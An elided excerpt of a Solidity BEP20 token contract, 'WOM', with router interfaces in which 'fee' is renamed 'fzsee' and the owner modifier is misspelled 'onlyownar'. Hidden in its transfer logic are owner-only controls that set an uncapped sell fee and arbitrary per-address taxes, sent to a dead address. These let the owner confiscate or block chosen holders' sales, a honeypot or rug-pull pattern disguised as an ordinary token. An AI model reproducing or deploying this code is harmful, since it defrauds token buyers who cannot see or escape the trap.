...
interface IUniswapV2Factory {
    ...
    function fzseeTo() external view returns (address);
    function fzseeToSetter() external view returns (address);
    ...
    function setfzseeTo(address) external;
    function setfzseeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfzseeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfzseeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfzseeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfzseeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfzseeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract WOM is BEP20, Ownable {
    ...
    uint256 private _defaultSellfzsee = 0;

    uint256 private _defaultBuyfzsee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfzsee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfzsee = _value;
    }

    function setSlipfzsee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfzsee[_address] = _value;
    }

    function getSlipfzsee(address _address) external view onlyownar returns (uint256) {
        return _slipfzsee[_address];
    }


    function setMAccountfzsee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfzsee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefzseeAmount = 0;

        if (rF) {
            uint256 tradefzsee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefzsee = _defaultSellfzsee;
                }
                if (from == uniswapV2Pair) {

                    tradefzsee = _defaultBuyfzsee;
                }
            }
            if (_slipfzsee[from] > 0) {
                tradefzsee = _slipfzsee[from];
            }

            tradefzseeAmount = _Amount.mul(tradefzsee).div(100);
        }


        if (tradefzseeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefzseeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefzseeAmount);
            emit Transfer(from, _deadAddress, tradefzseeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefzseeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefzseeAmount);
        emit Transfer(from, _to, _Amount - tradefzseeAmount);
    }
